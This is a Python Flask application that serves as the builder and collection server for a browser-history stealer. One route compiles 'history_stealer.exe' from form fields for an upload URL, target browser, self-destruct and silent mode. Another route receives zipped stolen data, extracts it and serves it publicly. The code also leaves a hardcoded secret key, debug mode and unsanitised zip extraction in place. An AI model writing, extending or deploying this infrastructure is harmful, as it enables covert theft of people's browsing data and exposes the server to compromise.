from flask import Flask, render_template, request, send_from_directory, flash, redirect, url_for
import os
import zipfile
import shutil
from builder import check_mingw, generate_config_h, compile_program

app = Flask(__name__)
app.secret_key = "supersecretkey"

# Directories
UPLOAD_FOLDER = "uploads"
UNZIPPED_FOLDER = "unzipped"
STATIC_FOLDER = "static"

# Ensure directories exist
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(UNZIPPED_FOLDER, exist_ok=True)
os.makedirs(STATIC_FOLDER, exist_ok=True)

@app.route("/")
def index():
    return redirect(url_for("uploads"))

@app.route("/uploads")
def uploads():
    zip_files = [f for f in os.listdir(UPLOAD_FOLDER) if f.endswith(".zip")]
    unzipped_files = []
    for root, _, files in os.walk(UNZIPPED_FOLDER):
        for file in files:
            rel_path = os.path.relpath(os.path.join(root, file), UNZIPPED_FOLDER)
            unzipped_files.append(rel_path)
    
    return render_template("uploads.html", zip_files=zip_files, unzipped_files=unzipped_files)

@app.route("/builder", methods=["GET", "POST"])
def builder():
    if request.method == "POST":
        # Get form data
        upload_url = request.form.get("upload_url", "http://example.com/upload")
        target_browser = request.form.get("target_browser", "2")
        upload_interval = request.form.get("upload_interval", "0")
        self_destruct = "1" if request.form.get("self_destruct") else "0"
        silent = "1" if request.form.get("silent") else "0"

        config = {
            "upload_url": upload_url,
            "target_browser": target_browser,
            "upload_interval_hours": upload_interval,
            "self_destruct": self_destruct,
            "silent": silent
        }

        try:
            if not check_mingw():
                flash("MinGW-w64 not found. Please ensure it is installed.", "error")
                return redirect(url_for("builder"))

            generate_config_h(config)
            compile_program(silent == "1")
            flash("Build successful! Executable created: history_stealer/history_stealer.exe", "success")
        except Exception as e:
            flash(f"Build failed: {str(e)}", "error")

        return redirect(url_for("builder"))

    return render_template("builder.html")

@app.route("/file_upload", methods=["POST"])
def file_upload():
    if "file" not in request.files or "json" not in request.form:
        return {"error": "Missing file or JSON payload"}, 400

    file = request.files["file"]
    json_data = request.form["json"]

    if file.filename == "":
        return {"error": "No file selected"}, 400

    if file and file.filename.endswith(".zip"):
        zip_path = os.path.join(UPLOAD_FOLDER, file.filename)
        file.save(zip_path)

        unzip_path = os.path.join(UNZIPPED_FOLDER, os.path.splitext(file.filename)[0])
        os.makedirs(unzip_path, exist_ok=True)
        with zipfile.ZipFile(zip_path, "r") as zip_ref:
            zip_ref.extractall(unzip_path)

        for root, _, files in os.walk(unzip_path):
            for f in files:
                src = os.path.join(root, f)
                dst = os.path.join(STATIC_FOLDER, os.path.relpath(src, unzip_path))
                os.makedirs(os.path.dirname(dst), exist_ok=True)
                shutil.copy2(src, dst)

        return {"status": "success", "json_received": json_data}, 200

    return {"error": "Invalid file type"}, 400

@app.route("/files/<path:filename>")
def serve_file(filename):
    return send_from_directory(STATIC_FOLDER, filename)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)